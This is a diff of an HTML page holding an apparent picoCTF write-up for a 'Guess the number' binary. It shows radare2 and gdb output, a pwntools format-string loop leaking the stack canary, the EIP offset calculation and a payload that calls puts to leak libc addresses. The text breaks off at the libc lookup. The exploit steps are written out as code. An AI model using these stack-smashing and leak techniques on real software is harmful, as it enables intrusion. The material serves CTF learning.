@@ -11,9 +11,80 @@
       span.underline{text-decoration: underline;}
       div.column{display: inline-block; vertical-align: top; width: 50%;}
   </style>
+  <style>
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+    background-color: #232629;
+    color: #7a7c7d;
+  }
+pre.numberSource { margin-left: 3em; border-left: 1px solid #7a7c7d;  padding-left: 4px; }
+div.sourceCode
+  { color: #cfcfc2; background-color: #232629; }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
+code span. { color: #cfcfc2; } /* Normal */
+code span.al { color: #95da4c; background-color: #4d1f24; font-weight: bold; } /* Alert */
+code span.an { color: #3f8058; } /* Annotation */
+code span.at { color: #2980b9; } /* Attribute */
+code span.bn { color: #f67400; } /* BaseN */
+code span.bu { color: #7f8c8d; } /* BuiltIn */
+code span.cf { color: #fdbc4b; font-weight: bold; } /* ControlFlow */
+code span.ch { color: #3daee9; } /* Char */
+code span.cn { color: #27aeae; font-weight: bold; } /* Constant */
+code span.co { color: #7a7c7d; } /* Comment */
+code span.cv { color: #7f8c8d; } /* CommentVar */
+code span.do { color: #a43340; } /* Documentation */
+code span.dt { color: #2980b9; } /* DataType */
+code span.dv { color: #f67400; } /* DecVal */
+code span.er { color: #da4453; text-decoration: underline; } /* Error */
+code span.ex { color: #0099ff; font-weight: bold; } /* Extension */
+code span.fl { color: #f67400; } /* Float */
+code span.fu { color: #8e44ad; } /* Function */
+code span.im { color: #27ae60; } /* Import */
+code span.in { color: #c45b00; } /* Information */
+code span.kw { color: #cfcfc2; font-weight: bold; } /* Keyword */
+code span.op { color: #cfcfc2; } /* Operator */
+code span.ot { color: #27ae60; } /* Other */
+code span.pp { color: #27ae60; } /* Preprocessor */
+code span.re { color: #2980b9; background-color: #153042; } /* RegionMarker */
+code span.sc { color: #3daee9; } /* SpecialChar */
+code span.ss { color: #da4453; } /* SpecialString */
+code span.st { color: #f44f4f; } /* String */
+code span.va { color: #27aeae; } /* Variable */
+code span.vs { color: #da4453; } /* VerbatimString */
+code span.wa { color: #da4453; } /* Warning */
+  </style>
   <!--[if lt IE 9]>
     <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
   <![endif]-->
+      <meta charset="UTF-8">
+      <meta name=”robots” content="index, follow">
+      <meta name="description" content="CTF Writeups, hacking techniques, reverse engineering & binary exploit, etc.">
+      <title>Onealmond</title>
       <link rel="stylesheet" type="text/css" href="../../css/global.css"></link>
       <script type="text/javascript" src="../../js/common.js"></script>
 </head>
@@ -25,160 +96,160 @@
 </header>
 <h2 id="guess-the-number">Guess the number</h2>
 <p>From the source code, we know the number is calculated with <code>rand</code> address.</p>
-<pre><code>(rand % 4096) + 1</code></pre>
+<div class="sourceCode" id="cb1"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb1-1"><a href="#cb1-1"></a>(rand <span class="op">%</span> <span class="dv">4096</span>) <span class="op">+</span> <span class="dv">1</span></span></code></pre></div>
 <p>The address might change when the program starts everytime, so we could search the number in range <em>[-4096, 4096]</em>.</p>
 <h2 id="disassemble-the-program">Disassemble the program</h2>
 <p>Run <code>radare2</code> to disassemble the program</p>
-<pre><code> r2 ./vuln</code></pre>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1"></a> <span class="ex">r2</span> ./vuln</span></code></pre></div>
 <p>Execute <code>pd $s &gt; vuln.asm</code> in r2, exam output <em>vuln.asm</em>, the canary is loaded from <code>gs:[0x14]</code>, which stored a random generated number, into <code>[ebp-0xc]</code>. Before the function returns, the canary is checked and call <code>__stack_chk_fail_local</code> on failed. The canary changes everytime the program start running, but the location on stack is fixed, so we need to find the canary address.</p>
-<pre><code>0x08048783      65a114000000   mov eax, dword gs:[0x14]
-0x08048789      8945f4         mov dword [ebp - 0xc], eax
-0x0804878c      31c0           xor eax, eax
-...
-0x080487e9      8b45f4         mov eax, dword [ebp - 0xc]
-0x080487ec      653305140000.  xor eax, dword gs:[0x14]
-0x080487f3      7405           je 0x80487fa
-0x080487f5      e816010000     call sym.__stack_chk_fail_local
-0x080487fa      8b5dfc         mov ebx, dword [ebp - 4]
-0x080487fd      c9             leave
-0x080487fe      c3             ret</code></pre>
+<div class="sourceCode" id="cb3"><pre class="sourceCode asm"><code class="sourceCode fasm"><span id="cb3-1"><a href="#cb3-1"></a><span class="bn">0x08048783      </span>65a114000000   <span class="bu">mov</span> <span class="kw">eax</span>, <span class="dt">dword</span> <span class="kw">gs</span>:[<span class="bn">0x14</span>]</span>
+<span id="cb3-2"><a href="#cb3-2"></a><span class="bn">0x08048789      </span>8945f4         <span class="bu">mov</span> <span class="dt">dword</span> [<span class="kw">ebp</span> - <span class="bn">0xc</span>], <span class="kw">eax</span></span>
+<span id="cb3-3"><a href="#cb3-3"></a><span class="bn">0x0804878c      </span>31c0           <span class="bu">xor</span> <span class="kw">eax</span>, <span class="kw">eax</span></span>
+<span id="cb3-4"><a href="#cb3-4"></a>...</span>
+<span id="cb3-5"><a href="#cb3-5"></a><span class="bn">0x080487e9      </span>8b45f4         <span class="bu">mov</span> <span class="kw">eax</span>, <span class="dt">dword</span> [<span class="kw">ebp</span> - <span class="bn">0xc</span>]</span>
+<span id="cb3-6"><a href="#cb3-6"></a><span class="bn">0x080487ec      </span><span class="fl">653305140000.</span>  <span class="bu">xor</span> <span class="kw">eax</span>, <span class="dt">dword</span> <span class="kw">gs</span>:[<span class="bn">0x14</span>]</span>
+<span id="cb3-7"><a href="#cb3-7"></a><span class="bn">0x080487f3      </span><span class="dv">7405</span>           <span class="bu">je</span><span class="bn"> 0x80487fa</span></span>
+<span id="cb3-8"><a href="#cb3-8"></a><span class="bn">0x080487f5      </span>e816010000     <span class="bu">call</span> sym.__stack_chk_fail_local</span>
+<span id="cb3-9"><a href="#cb3-9"></a><span class="bn">0x080487fa      </span>8b5dfc         <span class="bu">mov</span> <span class="kw">ebx</span>, <span class="dt">dword</span> [<span class="kw">ebp</span> - <span class="dv">4</span>]</span>
+<span id="cb3-10"><a href="#cb3-10"></a><span class="bn">0x080487fd      </span>c9             <span class="bu">leave</span></span>
+<span id="cb3-11"><a href="#cb3-11"></a><span class="bn">0x080487fe      </span>c3             <span class="bu">ret</span></span></code></pre></div>
 <h2 id="find-canary">Find canary</h2>
 <p>The winner name buffer allow us to input something, use the <code>printf</code> format string to print positional parameters, ‘%N$lx’ for the Nth parameter.</p>
-<pre><code>num = None
-for i in range(1, 200):
-    if num is None:
-        num = must_guess(pr)
-    else:
-        pr.sendlineafter(&quot;What number would you like to guess?\n&quot;, str(num))
-    pr.readline()
-    pr.sendlineafter(&quot;New winner!\nName? &quot;, &#39;XXX %{}$lx&#39;.format(i))
-    print(i, pr.readline())</code></pre>
+<div class="sourceCode" id="cb4"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb4-1"><a href="#cb4-1"></a>num <span class="op">=</span> <span class="va">None</span></span>
+<span id="cb4-2"><a href="#cb4-2"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">1</span>, <span class="dv">200</span>):</span>
+<span id="cb4-3"><a href="#cb4-3"></a>    <span class="cf">if</span> num <span class="kw">is</span> <span class="va">None</span>:</span>
+<span id="cb4-4"><a href="#cb4-4"></a>        num <span class="op">=</span> must_guess(pr)</span>
+<span id="cb4-5"><a href="#cb4-5"></a>    <span class="cf">else</span>:</span>
+<span id="cb4-6"><a href="#cb4-6"></a>        pr.sendlineafter(<span class="st">&quot;What number would you like to guess?</span><span class="ch">\n</span><span class="st">&quot;</span>, <span class="bu">str</span>(num))</span>
+<span id="cb4-7"><a href="#cb4-7"></a>    pr.readline()</span>
+<span id="cb4-8"><a href="#cb4-8"></a>    pr.sendlineafter(<span class="st">&quot;New winner!</span><span class="ch">\n</span><span class="st">Name? &quot;</span>, <span class="st">&#39;XXX %</span><span class="sc">{}</span><span class="st">$lx&#39;</span>.<span class="bu">format</span>(i))</span>
+<span id="cb4-9"><a href="#cb4-9"></a>    <span class="bu">print</span>(i, pr.readline())</span></code></pre></div>
 <p>In the output, several lines suspicious, like 20th, 119th and 166th.</p>
-<pre><code>...
-18 b&#39;Congrats: XXX 0\n&#39;
-19 b&#39;Congrats: XXX 1\n&#39;
-20 b&#39;Congrats: XXX 1cdadcae\n&#39;   canary?
-21 b&#39;Congrats: XXX 79804f\n&#39;
-22 b&#39;Congrats: XXX fffff7e0\n&#39;
-...
-116 b&#39;Congrats: XXX f7f69d20\n&#39;
-117 b&#39;Congrats: XXX 1c\n&#39;
-118 b&#39;Congrats: XXX ff8e5238\n&#39;
-119 b&#39;Congrats: XXX 1fc74300\n&#39;  canary?
-120 b&#39;Congrats: XXX f7f69d20\n&#39;
-121 b&#39;Congrats: XXX a\n&#39;
-...
-164 b&#39;Congrats: XXX 0\n&#39;
-165 b&#39;Congrats: XXX 73fe43f7\n&#39;
-166 b&#39;Congrats: XXX db4605e7\n&#39;   canary?
-167 b&#39;Congrats: XXX 0\n&#39;
-...</code></pre>
+<div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1"></a><span class="ex">...</span></span>
+<span id="cb5-2"><a href="#cb5-2"></a><span class="ex">18</span> b<span class="st">&#39;Congrats: XXX 0\n&#39;</span></span>
+<span id="cb5-3"><a href="#cb5-3"></a><span class="ex">19</span> b<span class="st">&#39;Congrats: XXX 1\n&#39;</span></span>
+<span id="cb5-4"><a href="#cb5-4"></a><span class="ex">20</span> b<span class="st">&#39;Congrats: XXX 1cdadcae\n&#39;</span>   canary?</span>
+<span id="cb5-5"><a href="#cb5-5"></a><span class="ex">21</span> b<span class="st">&#39;Congrats: XXX 79804f\n&#39;</span></span>
+<span id="cb5-6"><a href="#cb5-6"></a><span class="ex">22</span> b<span class="st">&#39;Congrats: XXX fffff7e0\n&#39;</span></span>
+<span id="cb5-7"><a href="#cb5-7"></a><span class="ex">...</span></span>
+<span id="cb5-8"><a href="#cb5-8"></a><span class="ex">116</span> b<span class="st">&#39;Congrats: XXX f7f69d20\n&#39;</span></span>
+<span id="cb5-9"><a href="#cb5-9"></a><span class="ex">117</span> b<span class="st">&#39;Congrats: XXX 1c\n&#39;</span></span>
+<span id="cb5-10"><a href="#cb5-10"></a><span class="ex">118</span> b<span class="st">&#39;Congrats: XXX ff8e5238\n&#39;</span></span>
+<span id="cb5-11"><a href="#cb5-11"></a><span class="ex">119</span> b<span class="st">&#39;Congrats: XXX 1fc74300\n&#39;</span>  canary?</span>
+<span id="cb5-12"><a href="#cb5-12"></a><span class="ex">120</span> b<span class="st">&#39;Congrats: XXX f7f69d20\n&#39;</span></span>
+<span id="cb5-13"><a href="#cb5-13"></a><span class="ex">121</span> b<span class="st">&#39;Congrats: XXX a\n&#39;</span></span>
+<span id="cb5-14"><a href="#cb5-14"></a><span class="ex">...</span></span>
+<span id="cb5-15"><a href="#cb5-15"></a><span class="ex">164</span> b<span class="st">&#39;Congrats: XXX 0\n&#39;</span></span>
+<span id="cb5-16"><a href="#cb5-16"></a><span class="ex">165</span> b<span class="st">&#39;Congrats: XXX 73fe43f7\n&#39;</span></span>
+<span id="cb5-17"><a href="#cb5-17"></a><span class="ex">166</span> b<span class="st">&#39;Congrats: XXX db4605e7\n&#39;</span>   canary?</span>
+<span id="cb5-18"><a href="#cb5-18"></a><span class="ex">167</span> b<span class="st">&#39;Congrats: XXX 0\n&#39;</span></span>
+<span id="cb5-19"><a href="#cb5-19"></a><span class="ex">...</span></span></code></pre></div>
 <p>Run the program from gdb, set a breakpoint at <em>0x080487e9</em>, where to load the prestored canary value into <em>eax</em>.</p>
-<pre><code>pwndbg&gt; b *0x080487e9
-Breakpoint 1 at 0x80487e9</code></pre>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1"></a><span class="ex">pwndbg</span><span class="op">&gt;</span> b *0x080487e9</span>
+<span id="cb6-2"><a href="#cb6-2"></a><span class="ex">Breakpoint</span> 1 at 0x80487e9</span></code></pre></div>
 <p>By checking the suspicious lines, the 119th looks like what we are looking for.</p>
-<pre><code>What number would you like to guess?
--2815
-Congrats! You win! Your prize is this print statement!
-
-New winner!
-Name? %119$lx
-Congrats: 9ef1d800</code></pre>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1"></a><span class="ex">What</span> number would you like to guess?</span>
+<span id="cb7-2"><a href="#cb7-2"></a><span class="ex">-2815</span></span>
+<span id="cb7-3"><a href="#cb7-3"></a><span class="ex">Congrats</span>! You win! Your prize is this print statement!</span>
+<span id="cb7-4"><a href="#cb7-4"></a></span>
+<span id="cb7-5"><a href="#cb7-5"></a><span class="ex">New</span> winner!</span>
+<span id="cb7-6"><a href="#cb7-6"></a><span class="ex">Name?</span> %119<span class="va">$lx</span></span>
+<span id="cb7-7"><a href="#cb7-7"></a><span class="ex">Congrats</span>: 9ef1d800</span></code></pre></div>
 <p>Execute one step forward and check the value in <em>eax</em>. which means the value at 119th indeed is the canary value.</p>
-<pre><code>pwndbg&gt; si
-0x080487ec in win ()
-LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
-─────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────────
-*EAX  0x9ef1d800
- EBX  0x8049fbc (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049ec4 (_DYNAMIC) ◂— 0x1
- ECX  0xffffffff
- EDX  0xffffffff
- EDI  0xf7edc000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
- ESI  0xf7edc000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
- EBP  0xff812258 —▸ 0xff812278 ◂— 0x0
- ESP  0xff812040 ◂— 0x1
-*EIP  0x80487ec (win+126) ◂— xor    eax, dword ptr gs:[0x14]
-──────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────────
-   0x80487e9 &lt;win+123&gt;    mov    eax, dword ptr [ebp - 0xc]
- ► 0x80487ec &lt;win+126&gt;    xor    eax, dword ptr gs:[0x14]
-   0x80487f3 &lt;win+133&gt;    je     win+140 &lt;win+140&gt;
-    ↓
-   0x80487fa &lt;win+140&gt;    mov    ebx, dword ptr [ebp - 4]
-   0x80487fd &lt;win+143&gt;    leave  
-   0x80487fe &lt;win+144&gt;    ret    
- 
-   0x80487ff &lt;main&gt;       lea    ecx, [esp + 4]
-   0x8048803 &lt;main+4&gt;     and    esp, 0xfffffff0
-   0x8048806 &lt;main+7&gt;     push   dword ptr [ecx - 4]
-   0x8048809 &lt;main+10&gt;    push   ebp
-   0x804880a &lt;main+11&gt;    mov    ebp, esp</code></pre>
+<div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1"></a><span class="ex">pwndbg</span><span class="op">&gt;</span> si</span>
+<span id="cb8-2"><a href="#cb8-2"></a><span class="ex">0x080487ec</span> in win ()</span>
+<span id="cb8-3"><a href="#cb8-3"></a><span class="ex">LEGEND</span>: STACK <span class="kw">|</span> <span class="ex">HEAP</span> <span class="kw">|</span> <span class="ex">CODE</span> <span class="kw">|</span> <span class="ex">DATA</span> <span class="kw">|</span> <span class="ex">RWX</span> <span class="kw">|</span> <span class="ex">RODATA</span></span>
+<span id="cb8-4"><a href="#cb8-4"></a>─────────────────────────────────────────────────────────────────────────────────────────[ <span class="ex">REGISTERS</span> ]─────────────────────────────────────────────────────────────────────────────────────────</span>
+<span id="cb8-5"><a href="#cb8-5"></a><span class="ex">*EAX</span>  0x9ef1d800</span>
+<span id="cb8-6"><a href="#cb8-6"></a> <span class="ex">EBX</span>  0x8049fbc (_GLOBAL_OFFSET_TABLE_) —▸ <span class="ex">0x8049ec4</span> (_DYNAMIC) ◂— <span class="ex">0x1</span></span>
+<span id="cb8-7"><a href="#cb8-7"></a> <span class="ex">ECX</span>  0xffffffff</span>
+<span id="cb8-8"><a href="#cb8-8"></a> <span class="ex">EDX</span>  0xffffffff</span>
+<span id="cb8-9"><a href="#cb8-9"></a> <span class="ex">EDI</span>  0xf7edc000 (_GLOBAL_OFFSET_TABLE_) ◂— <span class="ex">0x1ead6c</span></span>
+<span id="cb8-10"><a href="#cb8-10"></a> <span class="ex">ESI</span>  0xf7edc000 (_GLOBAL_OFFSET_TABLE_) ◂— <span class="ex">0x1ead6c</span></span>
+<span id="cb8-11"><a href="#cb8-11"></a> <span class="ex">EBP</span>  0xff812258 —▸ 0xff812278 ◂— 0x0</span>
+<span id="cb8-12"><a href="#cb8-12"></a> <span class="ex">ESP</span>  0xff812040 ◂— 0x1</span>
+<span id="cb8-13"><a href="#cb8-13"></a><span class="ex">*EIP</span>  0x80487ec (win+126) ◂— <span class="ex">xor</span>    eax, dword ptr gs:[0x14]</span>
+<span id="cb8-14"><a href="#cb8-14"></a>──────────────────────────────────────────────────────────────────────────────────────────[ <span class="ex">DISASM</span> ]───────────────────────────────────────────────────────────────────────────────────────────</span>
+<span id="cb8-15"><a href="#cb8-15"></a>   <span class="ex">0x80487e9</span> <span class="op">&lt;</span>win+<span class="op">123&gt;</span>    mov    eax, dword ptr [ebp - 0xc]</span>
+<span id="cb8-16"><a href="#cb8-16"></a> ► <span class="ex">0x80487ec</span> <span class="op">&lt;</span>win+<span class="op">126&gt;</span>    xor    eax, dword ptr gs:[0x14]</span>
+<span id="cb8-17"><a href="#cb8-17"></a>   <span class="ex">0x80487f3</span> <span class="op">&lt;</span>win+<span class="op">133&gt;</span>    je     win+140 <span class="op">&lt;</span>win+<span class="op">140&gt;</span></span>
+<span id="cb8-18"><a href="#cb8-18"></a>    ↓</span>
+<span id="cb8-19"><a href="#cb8-19"></a>   <span class="ex">0x80487fa</span> <span class="op">&lt;</span>win+<span class="op">140&gt;</span>    mov    ebx, dword ptr [ebp - 4]</span>
+<span id="cb8-20"><a href="#cb8-20"></a>   <span class="ex">0x80487fd</span> <span class="op">&lt;</span>win+<span class="op">143&gt;</span>    leave  </span>
+<span id="cb8-21"><a href="#cb8-21"></a>   <span class="ex">0x80487fe</span> <span class="op">&lt;</span>win+<span class="op">144&gt;</span>    ret    </span>
+<span id="cb8-22"><a href="#cb8-22"></a> </span>
+<span id="cb8-23"><a href="#cb8-23"></a>   <span class="ex">0x80487ff</span> <span class="op">&lt;</span>main<span class="op">&gt;</span>       lea    ecx, [esp + 4]</span>
+<span id="cb8-24"><a href="#cb8-24"></a>   <span class="ex">0x8048803</span> <span class="op">&lt;</span>main+<span class="op">4&gt;</span>     and    esp, 0xfffffff0</span>
+<span id="cb8-25"><a href="#cb8-25"></a>   <span class="ex">0x8048806</span> <span class="op">&lt;</span>main+<span class="op">7&gt;</span>     push   dword ptr [ecx - 4]</span>
+<span id="cb8-26"><a href="#cb8-26"></a>   <span class="ex">0x8048809</span> <span class="op">&lt;</span>main+<span class="op">10&gt;</span>    push   ebp</span>
+<span id="cb8-27"><a href="#cb8-27"></a>   <span class="ex">0x804880a</span> <span class="op">&lt;</span>main+<span class="op">11&gt;</span>    mov    ebp, esp</span></code></pre></div>
 <h2 id="find-eip-address">Find EIP address</h2>
 <p>We need to find EIP address to figure out how many padding do we need. Run the program in <code>gdb</code>, set a breakpoint at <em>leave</em> instruction in <code>win</code>, feed it 100 ‘A’.</p>
-<pre><code>pwndbg&gt; b *0x080487fd
-Breakpoint 1 at 0x80487fd
-pwndbg&gt; r
-Starting program: /home/zlynch-picoctf/vuln 
-warning: Error disabling address space randomization: Operation not permitted
-Welcome to my guessing game!
-Version: 2
-
-What number would you like to guess?
--2815
-Congrats! You win! Your prize is this print statement!
-
-New winner!
-Name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></pre>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1"></a><span class="ex">pwndbg</span><span class="op">&gt;</span> b *0x080487fd</span>
+<span id="cb9-2"><a href="#cb9-2"></a><span class="ex">Breakpoint</span> 1 at 0x80487fd</span>
+<span id="cb9-3"><a href="#cb9-3"></a><span class="ex">pwndbg</span><span class="op">&gt;</span> r</span>
+<span id="cb9-4"><a href="#cb9-4"></a><span class="ex">Starting</span> program: /home/zlynch-picoctf/vuln </span>
+<span id="cb9-5"><a href="#cb9-5"></a><span class="ex">warning</span>: Error disabling address space randomization: Operation not permitted</span>
+<span id="cb9-6"><a href="#cb9-6"></a><span class="ex">Welcome</span> to my guessing game!</span>
+<span id="cb9-7"><a href="#cb9-7"></a><span class="ex">Version</span>: 2</span>
+<span id="cb9-8"><a href="#cb9-8"></a></span>
+<span id="cb9-9"><a href="#cb9-9"></a><span class="ex">What</span> number would you like to guess?</span>
+<span id="cb9-10"><a href="#cb9-10"></a><span class="ex">-2815</span></span>
+<span id="cb9-11"><a href="#cb9-11"></a><span class="ex">Congrats</span>! You win! Your prize is this print statement!</span>
+<span id="cb9-12"><a href="#cb9-12"></a></span>
+<span id="cb9-13"><a href="#cb9-13"></a><span class="ex">New</span> winner!</span>
+<span id="cb9-14"><a href="#cb9-14"></a><span class="ex">Name?</span> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></code></pre></div>
 <p>Now it breaks, check the first 32 words at the top of the stack. The <em>0x41414141</em> block starts at <em>0xffce1d7c</em>, so we know this is where the buffer starts.</p>
-<pre><code>pwndbg&gt; x/32wx $esp
-0xffce1d70:     0x00000001      0xfffff501      0xfffff501      0x41414141
-0xffce1d80:     0x41414141      0x41414141      0x41414141      0x41414141
-0xffce1d90:     0x41414141      0x41414141      0x41414141      0x41414141
-0xffce1da0:     0x41414141      0x41414141      0x41414141      0x41414141
-0xffce1db0:     0x41414141      0x41414141      0x41414141      0x41414141
-0xffce1dc0:     0x41414141      0x41414141      0x41414141      0x41414141
-0xffce1dd0:     0x41414141      0x41414141      0x41414141      0x41414141
-0xffce1de0:     0x00000000      0x00000000      0x00000000      0x00000000</code></pre>
+<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1"></a><span class="ex">pwndbg</span><span class="op">&gt;</span> x/32wx <span class="va">$esp</span></span>
+<span id="cb10-2"><a href="#cb10-2"></a><span class="ex">0xffce1d70</span>:     0x00000001      0xfffff501      0xfffff501      0x41414141</span>
+<span id="cb10-3"><a href="#cb10-3"></a><span class="ex">0xffce1d80</span>:     0x41414141      0x41414141      0x41414141      0x41414141</span>
+<span id="cb10-4"><a href="#cb10-4"></a><span class="ex">0xffce1d90</span>:     0x41414141      0x41414141      0x41414141      0x41414141</span>
+<span id="cb10-5"><a href="#cb10-5"></a><span class="ex">0xffce1da0</span>:     0x41414141      0x41414141      0x41414141      0x41414141</span>
+<span id="cb10-6"><a href="#cb10-6"></a><span class="ex">0xffce1db0</span>:     0x41414141      0x41414141      0x41414141      0x41414141</span>
+<span id="cb10-7"><a href="#cb10-7"></a><span class="ex">0xffce1dc0</span>:     0x41414141      0x41414141      0x41414141      0x41414141</span>
+<span id="cb10-8"><a href="#cb10-8"></a><span class="ex">0xffce1dd0</span>:     0x41414141      0x41414141      0x41414141      0x41414141</span>
+<span id="cb10-9"><a href="#cb10-9"></a><span class="ex">0xffce1de0</span>:     0x00000000      0x00000000      0x00000000      0x00000000</span></code></pre></div>
 <p>Use <code>info frame</code> to find out where EIP is. <em>eip at 0xffce1f8c</em> in <em>saved registers</em> section tell us exactly what we are looking for.</p>
-<pre><code>pwndbg&gt; info frame
-Stack level 0, frame at 0xffce1f90:
- eip = 0x80487fd in win; saved eip = 0x804888c
- called by frame at 0xffce1fc0
- Arglist at 0xffce1f88, args: 
- Locals at 0xffce1f88, Previous frame&#39;s sp is 0xffce1f90
- Saved registers:
-  ebx at 0xffce1f84, ebp at 0xffce1f88, eip at 0xffce1f8c</code></pre>
+<div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1"></a><span class="ex">pwndbg</span><span class="op">&gt;</span> info frame</span>
+<span id="cb11-2"><a href="#cb11-2"></a><span class="ex">Stack</span> level 0, frame at 0xffce1f90:</span>
+<span id="cb11-3"><a href="#cb11-3"></a> <span class="ex">eip</span> = 0x80487fd in win<span class="kw">;</span> <span class="ex">saved</span> eip = 0x804888c</span>
+<span id="cb11-4"><a href="#cb11-4"></a> <span class="ex">called</span> by frame at 0xffce1fc0</span>
+<span id="cb11-5"><a href="#cb11-5"></a> <span class="ex">Arglist</span> at 0xffce1f88, args: </span>
+<span id="cb11-6"><a href="#cb11-6"></a> <span class="ex">Locals</span> at 0xffce1f88, Previous frame<span class="st">&#39;s sp is 0xffce1f90</span></span>
+<span id="cb11-7"><a href="#cb11-7"></a><span class="st"> Saved registers:</span></span>
+<span id="cb11-8"><a href="#cb11-8"></a><span class="st">  ebx at 0xffce1f84, ebp at 0xffce1f88, eip at 0xffce1f8c</span></span></code></pre></div>
 <p>By calculating the distance between EIP address and buffer address we know the padding is <em>528</em>. The buffer size is 512 bytes and canary is 4 bytes, so we need another 12 bytes of padding before EIP.</p>
-<pre><code>pwndbg&gt; p/d 0xffce1f8c-0xffce1d7c 
-$1 = 528</code></pre>
+<div class="sourceCode" id="cb12"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1"></a><span class="ex">pwndbg</span><span class="op">&gt;</span> p/d 0xffce1f8c-0xffce1d7c </span>
+<span id="cb12-2"><a href="#cb12-2"></a><span class="va">$1</span> = <span class="ex">528</span></span></code></pre></div>
 <p>We need to add 12 bytes padding to get to EIP after canary.</p>
 <h2 id="find-version-of-libc">Find version of libc</h2>
 <p>Now we need to call <code>puts</code> to print the address of itself, the payload would be</p>
 <p><code>padding(512bytes) + canary + padding(12bytes) + puts plt address + win address + puts got address</code></p>
 <p>Find address of <code>puts</code> on server by running the script.</p>
-<pre><code>elf = pwn.ELF(target, False)
-payload = b&#39;A&#39; * 512 + pwn.p32(canary) + b&#39;B&#39;*12
-payload += pwn.p32(elf.plt[&#39;puts&#39;])
-payload += pwn.p32(elf.sym[&#39;win&#39;])
-payload += pwn.p32(elf.got[&#39;puts&#39;])
-pr.sendlineafter(&quot;What number would you like to guess?\n&quot;, str(num))
-pr.sendlineafter(&quot;New winner!\nName? &quot;, payload)
-pr.readline()
-pr.readline()
-puts_addr = pwn.u32(pr.readline()[:4])</code></pre>
+<div class="sourceCode" id="cb13"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb13-1"><a href="#cb13-1"></a>elf <span class="op">=</span> pwn.ELF(target, <span class="va">False</span>)</span>
+<span id="cb13-2"><a href="#cb13-2"></a>payload <span class="op">=</span> b<span class="st">&#39;A&#39;</span> <span class="op">*</span> <span class="dv">512</span> <span class="op">+</span> pwn.p32(canary) <span class="op">+</span> b<span class="st">&#39;B&#39;</span><span class="op">*</span><span class="dv">12</span></span>
+<span id="cb13-3"><a href="#cb13-3"></a>payload <span class="op">+=</span> pwn.p32(elf.plt[<span class="st">&#39;puts&#39;</span>])</span>
+<span id="cb13-4"><a href="#cb13-4"></a>payload <span class="op">+=</span> pwn.p32(elf.sym[<span class="st">&#39;win&#39;</span>])</span>
+<span id="cb13-5"><a href="#cb13-5"></a>payload <span class="op">+=</span> pwn.p32(elf.got[<span class="st">&#39;puts&#39;</span>])</span>
+<span id="cb13-6"><a href="#cb13-6"></a>pr.sendlineafter(<span class="st">&quot;What number would you like to guess?</span><span class="ch">\n</span><span class="st">&quot;</span>, <span class="bu">str</span>(num))</span>
+<span id="cb13-7"><a href="#cb13-7"></a>pr.sendlineafter(<span class="st">&quot;New winner!</span><span class="ch">\n</span><span class="st">Name? &quot;</span>, payload)</span>
+<span id="cb13-8"><a href="#cb13-8"></a>pr.readline()</span>
+<span id="cb13-9"><a href="#cb13-9"></a>pr.readline()</span>
+<span id="cb13-10"><a href="#cb13-10"></a>puts_addr <span class="op">=</span> pwn.u32(pr.readline()[:<span class="dv">4</span>])</span></code></pre></div>
 <p>With the address we found matches using website <a href="https://libc.blukat.me/?q=puts%3A0xf7dab3d0&amp;l=libc6-i386_2.27-3ubuntu1.2_amd64">libc database search</a></p>
-<pre><code>Matches
-libc6-i386_2.27-3ubuntu1.2_amd64</code></pre>
+<div class="sourceCode" id="cb14"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb14-1"><a href="#cb14-1"></a>Matches</span>
